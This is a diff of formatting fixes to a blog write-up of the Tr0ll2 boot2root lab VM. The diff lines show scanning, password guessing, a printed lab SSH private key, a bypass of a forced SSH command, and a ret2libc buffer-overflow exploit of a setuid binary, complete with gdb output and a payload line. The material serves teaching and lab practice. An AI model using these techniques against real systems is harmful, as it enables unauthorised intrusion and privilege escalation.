@@ -8,18 +8,17 @@ categories:
 comments: true
 date: 2014-10-10T17:32:35Z
 title: another troll tamed - solving troll 2
-url: /2014/10/10/another-troll-tamed-solving-troll-2/
 ---
 
-##foreword
+## foreword
 
-[Tr0ll2]() is a successor in a boot2root series by [@Maleus21](https://twitter.com/Maleus21) hosted over at [VulnHub](http://vulnhub.com/). Having been able to [pwn Tr0ll1](https://leonjza.github.io/blog/2014/08/15/taming-the-troll/), I gave this one a shot too.
+[Tr0ll2](https://www.vulnhub.com/entry/tr0ll-2,107/) is a successor in a boot2root series by [@Maleus21](https://twitter.com/Maleus21) hosted over at [VulnHub](http://vulnhub.com/). Having been able to [pwn Tr0ll1](https://leonjza.github.io/blog/2014/08/15/taming-the-troll/), I gave this one a shot too.
 
 Here is my experience taming the troll, again.
 
 <!--more-->
 
-##getting started
+## getting started
 Like almost all boot2roots, we get right into it by slapping the VM into a hypervisor (VirtualBox in my case), discovering the IP address and running a `nmap` against it:
 
 ```bash
@@ -42,10 +41,10 @@ Nmap done: 1 IP address (1 host up) scanned in 15.21 seconds
 
 ftp, ssh and http. Quite an attack surface to start with. I start with a quick google for _vsftpd 2.0.8 exploit_ with nothing apparently obvious jumping out at me. I also quickly attempt to SSH to the server just to check if there aren't any strange banners etc to be found which was not the case.
 
-##web server
+## web server
 Opening up a browser to http://192.168.56.101 revealed a familiar image:
 
-{% img https://i.imgur.com/7lyyzPS.png %}
+{{< figure src="/images/troll2_web.png" >}}
 Oh. Hai. The sources serving up the image had the comment `<!-- Nothing to see here, but good try NOOB!>` with the image.
 
 Further poking around got me to checking if a robots.txt file was present. It was and contained some interestingly named entries. Some of the directories would 404, however a few would 200 with exactly the same content. The directories that returned HTTP 200 were:
@@ -59,7 +58,7 @@ Further poking around got me to checking if a robots.txt file was present. It wa
 
 The content served up at these URLs:
 
-{% img https://i.imgur.com/yH4vTKx.png %}
+{{< figure src="/images/troll2_noob.png" >}}
 
 The source that serves up this image had the comment `<!--What did you really think to find here? Try Harder!>` with the image.
 
@@ -75,7 +74,7 @@ HTTP request sent, awaiting response... 200 OK
 Length: 15831 (15K) [image/jpeg]
 Saving to: `cat_the_troll.jpg.3'
 
-100%[=======>] 15,831      --.-K/s   in 0s      
+100%[=======>] 15,831      --.-K/s   in 0s
 
 2014-10-10 07:31:37 (191 MB/s) - `cat_the_troll.jpg.3' saved [15831/15831]
 ```
@@ -111,12 +110,12 @@ root@kali:~/Desktop/troll2/c# tail -n 1 cat_the_troll.jpg.1
 
 _Look Deep within y0ur_self for the answer_. Hmm. Keeping in mind some of the previous tricks tr0ll had and the fact that the words _y0ur_self_ were written differently, I tried to use this as a web path:
 
-{% img https://i.imgur.com/oNInvrf.png %}
+{{< figure src="/images/troll2_y0ur_self.png" >}}
 
 I downloaded `answer.txt` and started to check what is happening inside:
 
 ```bash
-root@kali:~# head answer.txt 
+root@kali:~# head answer.txt
 QQo=
 QQo=
 QUEK
@@ -151,7 +150,7 @@ I decided to scroll through the list to see if I can spot anything out of the or
 
 My guess was that this has to be a password for either the FTP or SSH service.
 
-##ftpee
+## ftpee
 I now had what I assumed was a password. No other web related hints had me focussing there and I started to doubt my findings.
 
 As a last resort, I started to get together a wordlist that I could give to hydra to chew on. My idea was to grab all of the strings from the web service, including the one found in `answer.txt`, mutate it a bit and hand it over to hydra to do its work.
@@ -208,7 +207,7 @@ ftp> ls
 -rw-r--r--    1 0        0            1474 Oct 04 01:09 lmao.zip
 226 Directory send OK.
 
-ftp> get lmao.zip 
+ftp> get lmao.zip
 local: lmao.zip remote: lmao.zip
 227 Entering Passive Mode (192,168,56,101,105,73)
 150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
@@ -219,18 +218,18 @@ ftp> bye
 221 Goodbye.
 ```
 
-#noob key
-We find ourselves with a zip archive called `lmao.zip`. A encrypted one :( 
+## noob key
+We find ourselves with a zip archive called `lmao.zip`. A encrypted one :(
 
 I tried a few passwords from the wordlist that I had built earlier and eventually got to the word we got out of `answer.txt`:
 
 ```bash
-root@kali:~/Desktop/troll2# unzip lmao.zip 
+root@kali:~/Desktop/troll2# unzip lmao.zip
 Archive:  lmao.zip
 [lmao.zip] noob password: #ItCantReallyBeThisEasyRightLOL
   inflating: noob
 
-root@kali:~# cat noob 
+root@kali:~# cat noob
 -----BEGIN RSA PRIVATE KEY-----
 MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
 yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
@@ -263,13 +262,13 @@ zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
 A unencrypted private key! Called `noob`. I guessed `noob` may be the username, so I fixed up the permissions on the key and tried my luck:
 
 ```bash
-root@kali:~/Desktop/troll2# chmod 600 noob 
+root@kali:~/Desktop/troll2# chmod 600 noob
 root@kali:~/Desktop/troll2# ssh noob@192.168.56.101 -i noob
 TRY HARDER LOL!
 Connection to 192.168.56.101 closed.
 ```
 
-##shocking isn't it
+## shocking isn't it
 Surprise surprise. It seemed like we are in fact authenticating, but we don't have a shell. I figured one of two things could be happening here. First, the `.bashrc` may have been modified with something that echoes the text `TRY HARDER LOL!` and exits, or there is some restriction on the SSH key for `noob`.
 
 My first attempts were to specify a command with `-t` as `/bin/bash`, but this did not work.
@@ -284,7 +283,7 @@ uid=1002(noob) gid=1002(noob) groups=1002(noob)
 
 Shocking :) To confirm, the `authorized_keys` file has the entry `command="echo TRY HARDER LOL!" ` before the public key.
 
-##which door leads to r00t
+## which door leads to r00t
 With shell access to the machine, it was time to start enumerating and learn more about what we are facing next. Nothing particularly interesting popped up, until I noticed a directory `/nothing_to_see_here`.
 
 `/nothing_to_see_here` had another directory inside of it `choose_wisely/` with another 3 sub directories called `door1`, `door2` and `door3`.
@@ -292,10 +291,10 @@ With shell access to the machine, it was time to start enumerating and learn mor
 All 3 'doors' had a setuid binary called `r00t`. I ran the first one which had the output:
 
 ```bash
-noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t 
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t
 Good job, stand by, executing root shell...
 BUHAHAHA NOOB!
-noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ 
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$
 Broadcast message from noob@Tr0ll2
     (/dev/pts/0) at 0:48 ...
 
@@ -309,7 +308,7 @@ Dam. The VM promptly rebooted. Obviously I need to be a little more careful :D
 The machine rebooted and I logged in again as `noob`, changing directories to the `r00t` binaries. I tried to run `strings` on them, but it seems like the command was unavailable. No worries, next on the list was `od`.
 
 ```bash
-noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ od -S 1 door3/r00t 
+noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ od -S 1 door3/r00t
 [...]
 0001214 __libc_start_main
 0001236 GLIBC_2.0
@@ -317,7 +316,7 @@ noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ od -S 1 door3/r00t
 0001453 Q
 0001521 %
 0001526 h
-0001626 h 
+0001626 h
 0001646 h(
 0002066 t&
 0002073 '
@@ -329,7 +328,7 @@ noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ od -S 1 door3/r00t
 0002750 L
 0002760 p
 0003025 zR
-0003044  
+0003044
 0003060 p
 0003077 x
 [...]
@@ -339,7 +338,7 @@ So this is the binary that simply rebooted the machine. What is weird though is 
 
 This was only a minor annoyance and I had enough time to check out the binaries using `od` to figure out which one I should be looking at. The other binary that would have been a problem appears to chmod /bin/ls so that it becomes unusable. Lucky I missed that one.
 
-##bof bof bof your boat...
+## bof bof bof your boat...
 I copied the binary of interest to `/tmp` so that I wont be bothered by the shuffling thing that was going on again. Most importantly the one of interest was slightly bigger in size compared to the others so it was easy to identify it apart from the others.
 
 With the binary in `/tmp`, `noob` was the owner. For testing purposes this was ok as the exploit should work the same with the one with the desired permissions.
@@ -369,12 +368,12 @@ Segmentation fault
 500 "A"'s, and we have a crash. Perfect. It also seems like a really easy buffer overflow vulnerability. I quickly checked that ASLR was not enabled. If it is not, I planned on popping this one with a ret2libc attack.
 
 ```bash
-noob@Tr0ll2:/tmp$ ldd ./r00t 
+noob@Tr0ll2:/tmp$ ldd ./r00t
     linux-gate.so.1 =>  (0xb7fff000)
     libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
     /lib/ld-linux.so.2 (0x80000000)
 
-noob@Tr0ll2:/tmp$ ldd ./r00t 
+noob@Tr0ll2:/tmp$ ldd ./r00t
     linux-gate.so.1 =>  (0xb7fff000)
     libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e4e000)
     /lib/ld-linux.so.2 (0x80000000)
@@ -383,7 +382,7 @@ noob@Tr0ll2:/tmp$ ldd ./r00t
 Both entries returned the same address for libc, indicating that ASLR was not enabled :)
 Tr0ll2 was also nice enough to include `gdb`, making the exploit development process very easy.
 
-##the exploit
+## the exploit
 With all of the information gathered so far about this particularly interesting `r00t` binary, it was time to quickly write the overflow exploit to attempt and spawn us a root shell.
 
 First, we have to inspect the crash when we send those 500 A's
@@ -466,7 +465,7 @@ Reading symbols from /tmp/r00t...done.
 Breakpoint 1 at 0x8048444: file bof.c, line 3.
 
 (gdb) r         # here we run the application....
-Starting program: /tmp/r00t 
+Starting program: /tmp/r00t
 
 Breakpoint 1, main (argc=1, argv=0xbffffd84) at bof.c:3
 3   bof.c: No such file or directory.
@@ -496,9 +495,9 @@ EGG=/bin/sh
 Next, we can use a small C program to tell us where this EGG is in memory:
 
 ```bash
-noob@Tr0ll2:/tmp$ cat /tmp/findegg.c 
+noob@Tr0ll2:/tmp$ cat /tmp/findegg.c
 #include <unistd.h>
- 
+
 int main(void)
 {
   printf("EGG address: 0x%lx\n", getenv("EGG")+4);
@@ -508,7 +507,7 @@ int main(void)
 noob@Tr0ll2:/tmp$ gcc /tmp/findegg.c -o /tmp/findegg
 [...]
 
-noob@Tr0ll2:/tmp$ /tmp/findegg 
+noob@Tr0ll2:/tmp$ /tmp/findegg
 EGG address: 0xbfffff04
 ```
 
@@ -531,7 +530,7 @@ Wups, segfault. You will find that this is probably because the location of our 
 
 ```bash
 # so just to recap, we check for the location of the EGG
-noob@Tr0ll2:/tmp$ ./findegg 
+noob@Tr0ll2:/tmp$ ./findegg
 EGG address: 0xbfffff04
 
 # EGG is at 0xbfffff04, so in little endian format we have:
@@ -549,7 +548,7 @@ noob@Tr0ll2:/tmp$ ./r00t $(python -c 'print "A" *268 + "\x60\xb0\xe6\xb7" + "JUN
 $
 ```
 
-##trollin the rootin
+## trollin the rootin
 So `0xbfffff06` as a EGG location will give us shell in our testing! To finish off then, I have to find the correct `r00t` binary in all of the `door{1,2,3}` folders and attempt my exploit there:
 
 ```bash
